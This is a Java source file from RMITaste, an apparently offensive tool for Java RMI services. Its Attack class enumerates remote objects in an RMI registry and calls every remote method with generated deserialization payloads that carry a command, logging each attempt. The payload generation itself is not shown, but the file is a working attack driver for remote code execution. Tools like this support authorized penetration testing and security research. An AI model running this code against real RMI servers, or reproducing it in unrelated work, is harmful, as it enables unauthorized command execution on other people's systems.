package m0.rmitaste.rmi.exploit;

import m0.helpers.ArgumentParser;
import m0.rmitaste.rmi.RmiObject;
import m0.rmitaste.rmi.RmiObjectClass;
import m0.rmitaste.rmi.RmiObjectMethod;
import m0.rmitaste.rmi.RmiRegistry;
import m0.rmitaste.rmi.payload.PayloadGenerator;
import m0.rmitaste.utils.SimpleLogger;

import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * @author Marcin Ogorzelski (mzero - @_mzer0)
 */
public class Attack {
    // Logger
    private static Logger logger = SimpleLogger.getLog();

    private PayloadGenerator payloadGenerator;
    private RmiRegistry registry;

    private ArrayList<String> classBlackList;
    private ArrayList<String> methodBlackList;
    private ArrayList<String> methodWhiteList;


    public Attack(RmiRegistry rmiRegistry, PayloadGenerator payloadGenerator){
        this.payloadGenerator = payloadGenerator;
        this.registry = rmiRegistry;

        this.classBlackList = new ArrayList<String>();
        this.methodBlackList = new ArrayList<String>();
        this.methodWhiteList = new ArrayList<String>();

        this.classBlackList.add("java.lang.reflect.Proxy");
        this.classBlackList.add("java.rmi.server.RemoteStub");
    }

    public Attack(RmiRegistry rmiRegistry){
        this.payloadGenerator = null;
        this.registry = rmiRegistry;

        this.classBlackList = new ArrayList<String>();
        this.methodBlackList = new ArrayList<String>();
        this.methodWhiteList = new ArrayList<String>();

        this.classBlackList.add("java.lang.reflect.Proxy");
        this.classBlackList.add("java.rmi.server.RemoteStub");
    }

    /**
     * Generates payload and invokes all methods on remote object with this payload.
     */
    public void attackRegistry() {
        for (RmiObject ro : this.registry.getObjetcts()) {
            for (RmiObjectClass roc : ro.getClassesExtended().values()) {
                try{
                    // Check if class is remote and we should attack it
                    if(roc.isRemote()){
                        for (RmiObjectMethod rom : roc.getMethods().values()) {
                            this.invokeMethodPayload(ro, roc, rom);
                        }
                    }
                }catch(Exception ex){
                    this.logger.log(Level.SEVERE, "Could not invoke remote method: ", ex);
                }

            }
        }
    }

    /**
     * Generates payload and invokes methods from list on remote object with this payload.
     * @param list methods to attack
     */
    public void attackRegistry(ArrayList<String> list) {
        if(list.size() < 1){
            this.attackRegistry();
        }
        for(String row: list){
            try{
                ArrayList<String> target = ArgumentParser.parseMethodName(row);
                this.invokeMethodPayload(target.get(2), target.get(3), target.get(4));
            }catch(Exception ex){
                this.logger.log(Level.SEVERE, "Could not invoke remote method: "+row+". Exception: ", ex);
            }
        }
    }

    /**
     * Generates payload and invokes method on remote object with this payload.
     * @param rmiObject remote object to attack
     * @param className remote object class to attack
     * @param methodName remote object method to attack
     * @return remote method result
     * @throws Exception
     */
    public Object invokeMethodPayload(RmiObject rmiObject, String className, String methodName) throws Exception{
        Object result = null;
        // Locate class
        RmiObjectClass roc = rmiObject.getRmiObjectClass(className);
        if(roc == null){
            throw new Exception("Could not find class "+ className+" in remote object "+rmiObject+".");
        }
        // Locate method
        RmiObjectMethod rom = roc.getMethod(methodName);
        if(rom == null){
            throw new Exception("Could not find method "+ methodName+" in class "+className+".");
        }
        result = this.invokeMethodPayload(rmiObject, roc, rom);
        return result;
    }


    /**
     * Generates payload and invokes method on remote object with this payload.
     * @param rmiObject remote object to attack
     * @param roc remote object class to attack
     * @param rom remote object method to attack
     * @return remote method result
     */
    public Object invokeMethodPayload(RmiObject rmiObject, RmiObjectClass roc, RmiObjectMethod rom){
        // Get fake parameters. We only need an array of objects of a suitable length
        Object[] params = this.getFakeParameters(rom.getParametersArray());
        Object result = null;
        this.payloadGenerator.start();
        do {
            // If method has params and there is next payload then replace param with payload
            if (params.length > 0 && this.payloadGenerator.isNextPayload()) {
                this.payloadGenerator.generatePayload();
                params[0] = this.payloadGenerator.getPayload();
            } else {
                break;
            }
            logger.info("Using following payload: "+this.payloadGenerator.getPayloadName() +" "+this.payloadGenerator.getCmd());
            // Invoke method
            result = this.invokeMethod(rmiObject, roc, rom, params);
            logger.info("Remote method has been invoked with payload: "+this.payloadGenerator.getPayloadName() +" "+this.payloadGenerator.getCmd());
            System.out.println("Remote method has been invoked with payload: "+this.payloadGenerator.getPayloadName() +" "+this.payloadGenerator.getCmd());

        }while(!this.payloadGenerator.isEnd());

        this.payloadGenerator.end();

        return result;
    }

    /**
     * Generates payload and invokes method on remote object with this payload.
     * @param rmiObject name of remote object to attack
     * @param className name of remote object class to attack
     * @param methodName name of remote object method to attack
     * @return remote method result
     * @throws Exception
     */
    public Object invokeMethodPayload(String rmiObject, String className, String methodName) throws Exception{
        Object result = null;
        RmiObject ro = this.registry.getObject(rmiObject);
        if(ro == null){
            throw new Exception("Could not find remote object: "+ rmiObject +".");
        }
        result = this.invokeMethodPayload(ro, className, methodName);
        return result;
    }

    /**
     *  Invokes method on remote object with specific params
     * @param rmiObject remote object name
     * @param className remote object class name in which remote method is available
     * @param methodName remote method name
     * @param params remote method parameters
     * @return remote method result
     * @throws Exception
     */
    public Object invokeMethod(String rmiObject, String className, String methodName, Object[] params) throws Exception{
        // Locate Remote object
        RmiObject ro = this.registry.getObject(rmiObject);
        if(ro == null){
            throw new Exception("Could not find remote object: "+ rmiObject +".");
        }
        // Locate class
        RmiObjectClass roc = ro.getRmiObjectClass(className);
        if(roc == null){
            throw new Exception("Could not find class "+ className+" in remote object "+rmiObject+".");
        }
        // Locate method
        RmiObjectMethod rom = roc.getMethod(methodName);
        if(rom == null){
            throw new Exception("Could not find method "+ methodName+" in class "+className+".");
        }
        return this.invokeMethod(ro, roc, rom, params);
    }

    /**
     * Invokes method on remote object with specific params
     * @param rmiObject remote object
     * @param roc remote object class in which remote method is available
     * @param rom remote object method
     * @param params remote method parameters
     * @return remote method result
     */
    public Object invokeMethod(RmiObject rmiObject, RmiObjectClass roc, RmiObjectMethod rom, Object[] params){
        Object result = null;
        try{
            logger.info("Trying to invoke "+roc.getName()+"."+ rom.getName()+" method on "+rmiObject.getName());
            System.out.println("Trying to invoke "+roc.getName()+"."+ rom.getName()+" method on "+rmiObject.getName());
            // Invoke method
            result = rmiObject.invokeMethod(rom, params);
            logger.info("Method "+roc.getName()+"."+ rom.getName()+" invoked");
            System.out.println("Method "+roc.getName()+"."+ rom.getName()+" invoked");
        }catch (Throwable ex){
            logger.log(Level.WARNING,"An error occurred when calling "+ rom.getName() +" on "+rmiObject.getName() +". ", ex);
        }

        return result;
    }



    /**
     * Returns an array of strings that represent fake method parameters
     * @param types types of remote method parameters
     * @return an array of strings that represent fake method parameters.
     */
    public Object[] getFakeParameters(Class[] types) {
        Object[] result = new Object[types.length];
        for(int i = 0; i < types.length; i++){
            result[i] = "RMITaste";
        }
        return result;
    }
}
